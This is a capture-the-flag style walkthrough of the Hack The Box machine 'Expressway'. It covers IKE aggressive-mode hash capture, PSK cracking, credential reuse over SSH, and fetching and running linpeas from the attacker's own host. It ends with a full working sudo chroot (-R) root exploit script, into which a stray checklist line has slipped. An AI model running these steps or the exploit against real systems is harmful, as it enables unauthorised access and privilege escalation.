---
title: Expressway
date: 2026-06-02
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - easy
  - Port500-isakmp-Data-leak
  - Lateral-Movement-Account-Verify-Nxc
  - Port22-SSH-Login
  - Linux-Enumation-linpeas
  - Linux-Privilege-sudo
  - Linux
lastmod: 2026-06-04T03:27:28.396Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Expressway" >}}

***

# Recon

### PORT & IP SCAN

The Nmap scan results for the target host at **10.129.238.52** identify only one accessible entry point: **Port 22**, which is **open** and running the **SSH** service. While the scan was completed quickly in approximately 10 seconds using a high aggressive rate (`-T 5` and `--min-rate 10000`), the presence of 352 filtered ports and several dropped probes suggests that the aggressive timing may have hit a retransmission cap, potentially causing Nmap to skip some ports. Aside from the confirmed open SSH port, the rest of the 65,535 ports were either actively closed by the target or filtered by a firewall, indicating a hardened security posture that restricts communication primarily to secure remote management.

```
┌─[tester@parrot]─[~/Desktop/HTB/Expressway]                                                                                                                                    17:04:11 [3/3]
└──╼ $sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.238.52 --min-rate 10000                                                                                                        
[sudo] password for tester:  
Warning: The -o option is deprecated. Please use -oN                                           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-03 17:03 HKT
Initiating Ping Scan at 17:03                                                                  
Scanning 10.129.238.52 [4 ports]                                                               
Completed Ping Scan at 17:03, 0.25s elapsed (1 total hosts)                                    
Initiating Parallel DNS resolution of 1 host. at 17:03                                         
Completed Parallel DNS resolution of 1 host. at 17:03, 0.42s elapsed                           
Initiating SYN Stealth Scan at 17:03                                                                                                                                                          
Scanning 10.129.238.52 [65535 ports]                                                           
Discovered open port 22/tcp on 10.129.238.52                                                   
Increasing send delay for 10.129.238.52 from 0 to 5 due to 1425 out of 3561 dropped probes since last increase.                                                                               
Warning: 10.129.238.52 giving up on port because retransmission cap hit (2).
Completed SYN Stealth Scan at 17:03, 10.07s elapsed (65535 total ports)                        
Nmap scan report for 10.129.238.52                                                             
Host is up, received echo-reply ttl 63 (0.24s latency).                                        
Scanned at 2026-06-03 17:03:31 HKT for 10s
Not shown: 65182 closed tcp ports (reset), 352 filtered tcp ports (no-response)                
PORT   STATE SERVICE REASON                 
22/tcp open  ssh     syn-ack ttl 63                                                            
                                                                                               
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds                                                                                                                                  
           Raw packets sent: 92378 (4.065MB) | Rcvd: 85778 (3.431MB)

```

Based on the UDP scan of the top 20 ports, the target at **10.129.238.52** reveals a focus on VPN and network configuration services. Specifically, **Port 500/udp (ISAKMP)** is confirmed **open**, which is typically used for negotiating security associations in IPsec VPNs. Additionally, ports **68 (dhcpc)**, **69 (tftp)**, and **4500 (nat-t-ike)** are reported as **open|filtered**, meaning Nmap received no response and cannot definitively determine if the services are active or merely protected by a firewall. The majority of other common UDP services, including DNS (53), SNMP (161), and SMB (445), are explicitly **closed**, suggesting the host is likely acting as a specialized gateway or VPN endpoint rather than a general-purpose server.

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Expressway]
└──╼ $sudo nmap -sU --top-port=20 10.129.238.52
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-03 17:05 HKT
Nmap scan report for 10.129.238.52
Host is up (0.36s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open          isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

```

### UDP 500 isakmp

{{< toggle "Tag 🏷️" >}}

{{< tag "Port500-isakmp-Data-leak" >}} The tool to enumerate IKE is `ike-scan` (`sudo apt install ike-scan`), IKE also has a mode known as Aggressive Mode for leaking an identity, ike@expressway.htb. I can capture the handshake and see if the PSK is crackable on udp:

{{< /toggle >}}

Red : https://hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Expressway]
└──╼ $sudo ike-scan  M 10.129.238.52 
WARNING: gethostbyname failed for "M" - target ignored: Success
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Main Mode Handshake returned HDR=(CKY-R=197562759c45953f) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.241 seconds (4.15 hosts/sec).  1 returned handshake; 0 returned notify

```

IKE also has a mode known as Aggressive Mode. For the Main Mode IKE exchange, there are six packets exchanged:

1. SA proposal (encryption/hash/DH group)
2. SA accepted
3. Key exchange (DH public values)
4. Key exchange response
5. Identity + hash (encrypted)
6. Identity + hash response (encrypted)

In Aggressive Mode, there are only three packets:

1. SA proposal + key exchange + identity + hash (all at once)
2. SA accepted + key exchange + hash
3. Confirmation

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Expressway]
└──╼ $sudo ike-scan -A 10.129.238.52  --pskcrack=handshake.txt
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned HDR=(CKY-R=84d97e2451b83da3) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.244 seconds (4.10 hosts/sec).  1 returned handshake; 0 returned notify
┌─[tester@parrot]─[~/Desktop/HTB/Expressway]
└──╼ $cat handshake.txt 
5acc6eb43dfb95ac99900adc8bbd748e94d564c4e6a408b8779c75ba52241ac5fccdbb56692a50d579da4fd634ab283cf23b983aaebfc6de858f6ee75fd6e9c82dd10a60a9ce8dbccc5e8288c861d433f37bbc6468931a098ec77c4cefd16cb164de19ea31e61e25a20ea5e9ab6ae0bd53203445e992a6a11166a2b85f519f8d:86a0fb4ff025cffd087d5cbe8e4cb6d27fe3d60612678cb7c979a720d65b23d4e9fe0eaf64f894fd128c606453234210bcbd739a067b4bb42cf7cb685813c7f8742ec5bb5651ab73bfc7ad3d570ff440df3da79c24539e4021f7054be1796f46925c71cac512440054274209a310c82915952c5088804f0896a299e1905cbb7c:84d97e2451b83da3:d6322fa43dea48a4:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:0c04d8d5014bcdf6d4fead8bb6ed2a5935326059:caf876b6b4c4cdea5071b4edfa8fa2670befb173176adb6bb1ea5832ed8df1eb:1bddb8b9d6eb05be8d0f741828957e5990908c77

```

It leaks an identity, `ike@expressway.htb`. I can capture the handshake and see if the PSK is crackable:

```
$ hashcat handshake.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5400 | IKE-PSK SHA1 | Network Protocol
...[snip]...
5f18934ade21c1ea878b43cb5dfbd15a6712c6b7e8059de5c761e96770992ec00cc936c14702418290f0234c59c22db26fb50511dda1f8b109a00312eff1b7a94eac0060a7af81a5ea0f875fa149390bfd656f705f75d5a9caf7b82164473bf6900a372e07157c818a7a61ea80dd55683e7e3e23658e974546c8a1daa7d9742c:4837a17dfc65579b94f1a9541706d23c5d05b7120404ba5661de2525d499ef9e2589cea69e4d5232c9bcecfa6a4d8337773e09e77db5ecb83c06c6f2cc285bb13faf57f0703ac4c0c3be94160eb21ba7c51424a0942959139248fb27194a51226491897e11fe0bc8039005efae6602999b0b32c902bde47cdbb44d224afd05e8:66937bae6c61c21c:56832105b4a63bf2:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:a0f93a12e5983e779063b92ed29237ec3f2676f3:62411bb2501244c6e6e39b44fc811d0834de3d06201a97900e16436c6243cfbe:c4d7d30dc03e5ac1d5f03f015fbf88de1078b4b1:freakingrockstarontheroad
...[snip]...
```

`hashcat` is able to recognize the format and cracks it in 11 seconds on my host: with the ike : freakingrockstarontheroad

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Account-Verify-Nxc" >}} Testing multiple login protocols to validate credentials and identify remote access channels.

{{< /toggle >}}

```autohotkey
┌─[tester@parrot]─[~/Desktop/HTB/Expressway]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto 10.129.238.52 -u 'ike' -p 'freakingrockstarontheroad'; done

[*] Testing smb...

[*] Testing winrm...

[*] Testing wmi...

[*] Testing rdp...

[*] Testing ssh...
SSH         10.129.238.52   22     10.129.238.52    [*] SSH-2.0-OpenSSH_10.0p2 Debian-8
SSH         10.129.238.52   22     10.129.238.52    [+] ike:freakingrockstarontheroad  Linux - Shell access!

[*] Testing ldap...

[*] Testing mssql...

[*] Testing ftp...

```

### ssh 22

{{< toggle "Tag 🏷️" >}}

{{< tag "Port22-SSH-Login" >}} The simple ssh login

{{< /toggle >}}

```
─[✗]─[tester@parrot]─[~/Desktop/HTB/Expressway]
└──╼ $ssh ike@10.129.238.52  -P 'freakingrockstarontheroad' 
The authenticity of host '10.129.238.52 (10.129.238.52)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.238.52' (ED25519) to the list of known hosts.
ike@10.129.238.52's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 3 10:21:26 2026 from 10.10.16.128
ike@expressway:~$ whoami 
ike

```

### Linpeas

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Enumation-linpeas" >}} Using the linpeas linpeas.sh on linux to analysis the exploit . using the tmux 's search function of Files with Interesting Permissions

{{< /toggle >}}

* Files with Interesting Permissions

```
┌─[tester@parrot]─[~/Desktop/Tools]
└──╼ $curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh  -O linpeas.sh

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/Tools]
└──╼ $sudo python3 -m http.server 80 #Host
[sudo] password for tester: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

With exploited Linux

```
ike@expressway:~$ curl http://10.10.16.128/linpeas.sh -o /dev/shm/linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1038k  100 1038k    0     0   240k      0  0:00:04  0:00:04 --:--:--  252k
```

```
ike@expressway:~$ chmod +x /dev/shm/linpeas.sh 
ike@expressway:~$ bash  /dev/shm/linpeas.sh   
```

### check point

Check every red and  RED/YELLOW that the linpeas highlight

```
 LEGEND:                                                                                                                                                                                      
  RED/YELLOW: 95% a PE vector                                                                                                                                                                 
  RED: You should take a look into it                                                                                                                                                         
  LightCyan: Users with console                                                                                                                                                               
  Blue: Users without console & mounted devs                                                                                                                                                  
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)                                                                                                              
  LightMagenta: Your username        
```

```
╔══════════╣ Checking for Copy Fail (CVE-2026-31431) (T1068)
╚ https://copy.fail/
╚ https://www.cve.org/CVERecord?id=CVE-2026-31431
VULNERABLE: non-destructive AF_ALG/splice page-cache write triggered
```

```
╔══════════╣ Kernel Exploit Registry (T1068)
═╣ Operating system ............. Linux
═╣ Kernel release ............... 6.16.7+deb14-amd64
═╣ Comparable version ........... 6.16.7
═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..21)
═╣ Kernel config source ......... /boot/config-6.16.7+deb14-amd64
CVE: CVE-2025-38236 | Name: AF_UNIX MSG_OOB UAF | Match data: pkg=linux-kernel,ver>=6.9.0 | Tags: 1 | Rank: Migrated from former standalone 1_system_information check
═╣ Kernel vulns found: 1
```

They open the tftp ?

```
root        3840  0.0  0.0   2900   640 ?        Ss   07:06   0:00 /usr/sbin/in.tftpd --listen --user tftp --address :69 --secure /srv/tftp

```

```
root        3790  0.1  0.7 445340 29380 ?        Ssl  07:06   0:14 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

### SetUID

The SetUID binaries on Expressway look pretty normal at first glance:

```
ike@expressway:/$ find / -perm -4000 -type f 2>/dev/null
/usr/sbin/exim4
/usr/local/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

```

linpeas has do it

```
                      ╔════════════════════════════════════╗                                   
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝                                   
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)                   
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid 
strace Not Found                   
-rwsr-xr-x 1 root root 1.5M Aug 14  2025 /usr/sbin/exim4
-rwsr-xr-x 1 root root 1023K Aug 29  2025 /usr/local/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 116K Aug 26  2025 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 75K Sep  9  2025 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 87K Aug 26  2025 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 91K Sep  9  2025 /usr/bin/su
-rwsr-xr-x 1 root root 276K Jun 27  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                         
-rwsr-xr-x 1 root root 63K Sep  9  2025 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 70K Aug 26  2025 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Aug 26  2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 19K Sep  9  2025 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-- 1 root messagebus 51K Mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 483K Aug 10  2025 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 14K Aug 28  2025 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 15K Aug 28  2025 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper


```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-sudo" >}} Using the  find / -perm -4000 -type f 2>/dev/null to what SetUID binaries is weird , and the sudo is double , after checking the version , know the sudo is exploited

{{< /toggle >}}

but the `/usr/local/bin/sudo` should be in the /usr/local/sudo

```
ike@expressway:/$ find / -perm -4000 -type f 2>/dev/null
/usr/sbin/exim4
/usr/local/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

```
ike@expressway:/$ /usr/local/bin/sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17

ike@expressway:/$ /usr/bin/sudo --version
Sudo version 1.9.13p3
Sudoers policy plugin version 1.9.13p3
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.13p3
Sudoers audit plugin version 1.9.13p3
```

linpeas has do it

```
                      ╔════════════════════════════════════╗                                   
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝                                   
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)                   
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid 
strace Not Found                   
-rwsr-xr-x 1 root root 1.5M Aug 14  2025 /usr/sbin/exim4
-rwsr-xr-x 1 root root 1023K Aug 29  2025 /usr/local/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 116K Aug 26  2025 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 75K Sep  9  2025 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 87K Aug 26  2025 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 91K Sep  9  2025 /usr/bin/su
-rwsr-xr-x 1 root root 276K Jun 27  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                         
-rwsr-xr-x 1 root root 63K Sep  9  2025 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 70K Aug 26  2025 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Aug 26  2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 19K Sep  9  2025 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-- 1 root messagebus 51K Mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 483K Aug 10  2025 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 14K Aug 28  2025 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 15K Aug 28  2025 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper


```

### Exploit

```
ike@expressway:~$ cat exploit.sh 
#!/bin/bash
STAGE=$(mktemp -d /tmp/sudostage.XXXX)
- [ ] cd "$STAGE"

cat > xd1337.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void xd1337(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p xd/etc libnss_
echo "passwd: /xd1337" > xd/etc/nsswitch.conf
cp /etc/group xd/etc/

gcc -shared -fPIC -Wl,-init,xd1337 -o libnss_/xd1337.so.2 xd1337.c

sudo -R xd /bin/true
ike@expressway:~$ chmod +x exploit.sh 
ike@expressway:~$ bash exploit.sh 
root@expressway:/# whoami 
root
```
